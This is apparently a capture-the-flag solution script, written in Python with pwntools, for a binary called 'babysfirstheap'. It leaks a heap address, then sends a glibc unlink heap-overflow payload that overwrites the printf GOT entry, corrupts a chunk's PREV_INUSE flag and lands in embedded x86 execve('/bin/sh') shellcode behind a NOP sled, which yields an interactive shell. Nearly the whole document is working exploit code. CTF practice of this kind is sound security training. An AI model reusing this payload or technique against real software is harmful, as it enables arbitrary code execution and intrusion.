# Sol by aidielse
from pwn import *
import time

p = process("./babysfirstheap")

p.recvuntil("Exit function pointer is at ")
data = p.recv()

exit_ptr = data.split()[0]

# get heap address of our shellcode
shellcode_addr = data.split("\n")[11].split("loc=")[1].split("]")[0]
shellcode_addr = p32(int(shellcode_addr,16)+8)


# use unlink to overwrite printf ptr in the GOT
payload = "\xfc\xbf\x04\x08" + shellcode_addr

shellcode = "\x31\xc9\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# send payload, we're also overwriting the PREV_INUSE flag of the next chunk
# we do this so that when the chunk before our chunk gets freed, free thinks
# our chunk is not in use and tries to coalesce which causes an overwrite.

# see https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/
# and https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/

payload += "\x90"*21 + shellcode + "\x90"*204 + "\x78\x03\x00\x00"

p.sendline(payload)
p.interactive()
